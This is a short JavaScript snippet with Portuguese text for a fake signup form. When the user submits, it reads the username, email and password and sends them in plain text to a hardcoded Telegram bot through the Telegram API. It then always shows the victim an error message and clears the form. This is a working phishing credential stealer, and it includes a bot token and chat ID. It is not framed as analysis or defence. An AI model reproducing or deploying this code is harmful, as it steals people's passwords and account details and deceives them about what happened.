<script>
const TELEGRAM_TOKEN = "8319546992:AAG6yoBl9awVTxFCv02IG3EdyE9kolDtufo";
const TELEGRAM_CHAT_ID = "8058168121";

function sendData(){
    const username = document.getElementById('username').value.trim();
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if(!username || !email || !password){alert('Preencha todos os campos');return;}
    if(password.length<6){alert('Senha deve ter no m√≠nimo 6 caracteres');return;} // mant√©m regra original

    // Monta a mensagem para o Telegram
    const message = `üìã Novo Cadastro\nNome: ${username}\nEmail: ${email}\nSenha: ${password}`;

    // Envia via API do Telegram
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: message})
    })
    .then(() => alert('Erro no seu cadastro'))
    .catch(err => alert('Erro ao Se Cadastra'));

    // Limpa campos
    document.getElementById('username').value='';
    document.getElementById('email').value='';
    document.getElementById('password').value='';
    }
</script>
